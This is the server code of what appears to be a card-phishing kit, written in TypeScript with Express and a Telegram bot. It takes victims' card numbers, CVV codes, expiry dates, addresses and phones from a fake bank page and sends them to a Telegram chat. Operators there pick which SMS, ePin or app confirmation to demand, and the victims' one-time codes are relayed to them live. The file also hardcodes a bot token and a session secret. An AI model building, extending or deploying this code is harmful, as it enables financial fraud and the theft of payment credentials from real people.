import BotTelegram from "node-telegram-bot-api";
import express from "express";
import { Request, Response } from "express";
import fs from "fs";
import bodyParser from "body-parser";
import morgan from "morgan";
import { getBankNameByBin } from "./helper/helper";
import * as dotenv from "dotenv";
import cors from "cors";
import path from "path";
import session from "express-session";
import ClientRepository from "./repository/ClientRepository";

dotenv.config();

const oneDay = 1000 * 60 * 30;;
const app = express();
const port = 5000;
const bot = new BotTelegram("5872192467:AAEEYD7BiIxVb6-0d05S4KhfiXQDZ09zYk0", {
  polling: true,
});
const clientRepository = new ClientRepository();

app.use(
  session({
    secret: "thisismysecrctekeyfhrgfgrfrty84fwir767",
    saveUninitialized: true,
    cookie: {
      maxAge: oneDay,
      secure: false,
    },
    resave: false,
  })
);
app.use(morgan("dev"));
app.use(
  "/",
  cors({
    origin: "*",
  })
);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const chatId = -1001644355436;

const startMenu = async (res: Response, token: string, msgId: string) => {
  let response: string;
  bot.once("callback_query", async (query) => {
    switch (query.data) {
      case "sms":
        bot.sendMessage(query.from.id, "⏱ Ожидаем код подтверждения по СМС");
        response = "sms";
        break;
      case "invalid card":
        bot.sendMessage(query.from.id, "Карта не верна");
        response = "back";
        break;
      case "ePin":
        bot.sendMessage(query.from.id, "⏱ Ожидаем код подтверждения по ePin");
        response = "ePin";
        break;
      case "app":
        bot.sendMessage(query.from.id, "⏱ Ожидаем подтверждения по приложению");
        response = "app";
        break;
      case "payment successful":
        bot.sendMessage(query.from.id, "Оплата успешна");
        response = "success";
        break;
    }
    await clientRepository.addManager(token, query.from.id + "");
    bot.answerCallbackQuery(query.id, {});
    const clientInfo = await clientRepository.get(token);
    const { manager } = clientInfo!;
    if (manager) {
      bot.deleteMessage(manager, msgId);
    }
    bot.deleteMessage(chatId, msgId);
    res.status(200).json(response);
  });
};

const userCard = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "SMS", callback_data: "sms" },
        { text: "Карта не верная", callback_data: "invalid card" },
      ],
      [
        { text: "ePin", callback_data: "ePin" },
        { text: "Приложение", callback_data: "app" },
      ],
    ],
  },
};

const payment = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "SMS", callback_data: "sms" },
        { text: "Карта не верная", callback_data: "invalid card" },
      ],
      [
        { text: "ePin", callback_data: "ePin" },
        { text: "Приложение", callback_data: "app" },
      ],
      [{ text: "Оплата успешна", callback_data: "payment successful" }],
    ],
  },
};

app.post("/api/user-card", async (req: Request, res: Response) => {
  const token = req.sessionID;
  try {
    const {
      firstname,
      lastname,
      card,
      cvv,
      expiry_date,
      price,
      address,
      phone,
    } = req.body;
    
    const client = await clientRepository.get(token);
    if (client) {
      await clientRepository.delete(token);
    } 
    clientRepository.create({
      token,
      firstname,
      lastname,
      card,
      cvv,
      expiry_date,
      price,
      address,
      phone,
    })
    res.status(200).json(token);
  } catch (err) {
    res.status(500).json(err);
  }
});

app.get("/api/confirmation-card", async (req: Request, res: Response) => {
  const token = req.sessionID;
  let msg: BotTelegram.Message;
  try {
    const client = await clientRepository.get(token);
    if (client) {
      msg = await bot.sendMessage(
        chatId,
        `💳: ${client.card}\ncvv: ${client.cvv}\nдата: ${client.expiry_date}\ncумма: ${client.expiry_date}`,
        userCard
      );
      await startMenu(res, token, msg.message_id + "");
    }
  } catch (err) {
    res.status(500).json(err);
  }
});

app.post("/api/confirmation", async (req: Request, res: Response) => {
  try {
    const token = req.sessionID;
    const { method, body } = req.body;
    await clientRepository.addConfirmation(token, method, body);
    res.status(200).json(body);
  } catch (err) {
    res.status(500).json(err);
  }
});

app.get("/api/payment-confirmation", async (req: Request, res: Response) => {
  const token = req.sessionID;
  let msg: BotTelegram.Message;
  try {
    const clientInfo = await clientRepository.get(token);
    if (clientInfo) {
      const { confirmation: confirm } = clientInfo;
      if (confirm === "app") {
        msg = await bot.sendMessage(
          clientInfo.manager!,
          `Клиент подтвердил платеж по приложению\n💳: ${clientInfo.confirmation_value}`,
          payment
        );
      } else {
        msg = await bot.sendMessage(
          clientInfo.manager!,
          `Клиент прислал код для подтверждения ${confirm}.\n🔑: ${clientInfo.confirmation_value}\n💳: ${clientInfo.card}`,
          payment
        );
      }
      startMenu(res, token, msg.message_id + "");
    }
  } catch (err) {
    res.status(500).json(err);
  }
});

app.post("/api/success", async (req: Request, res: Response) => {
  req.session.destroy((err) => {});
  try {
    const { command } = req.body;
    res.status(200).json(command);
  } catch (err) {
    res.status(500).json(err);
  }
});

app.post("/api/need-help", async (req: Request, res: Response) => {
  const token = req.sessionID;
  const clientInfo = await clientRepository.get(token);
  if (clientInfo) {
    try {
      const { command } = req.body;
      await bot.sendMessage(
        clientInfo.manager!,
        `🆘 Клиент попросил помощи, выберите один из вариантов:`
      );
      res.status(200).json(command);
    } catch (err) {
      res.status(500).json(err);
    }
  }
});

app.get("/img/:number", async (req: Request, res: Response) => {
  const bin: number = Number(req.params.number);
  const card = getBankNameByBin(bin)?.split("-");
  try {
    if (card) {
      const img = fs.readFileSync(__dirname + `/img/${card[1]}.PNG`, "base64");
      res.status(200).json({
        img: img,
        method: card[0],
      });
      res.end();
    }
  } catch (err) {
    res.status(500).json(err);
  }
});

app.get("/api/order-info", async (req: Request, res: Response) => {
  const token = req.sessionID;
  const clientInfo = await clientRepository.get(token);
  if (clientInfo) {
    res.status(200).json({ price: clientInfo.price });
  }
});

app.listen(port, () => {
  console.log("Server starts on port: http://localhost:" + port);
});

app.use(express.static(path.join(__dirname, "..", "..", "..", "bank")));

app.get("*", (req: Request, res: Response) => {
  res.sendFile(path.join(__dirname, "..", "..", "..", "bank", "index.html"));
});
